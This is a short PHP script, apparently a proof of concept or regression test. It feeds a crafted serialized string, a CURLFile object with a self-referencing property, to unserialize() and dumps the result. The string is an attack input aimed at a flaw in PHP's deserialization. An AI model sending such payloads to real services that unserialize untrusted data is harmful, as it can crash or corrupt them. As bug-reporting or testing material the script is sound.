<?php

$poc = 'a:1:{i:0;O:8:"CURLFile":1:{s:4:"name";R:1;}}';
try {
var_dump(unserialize($poc));
} catch(Exception $e) {
	echo $e->getMessage();
}
?>
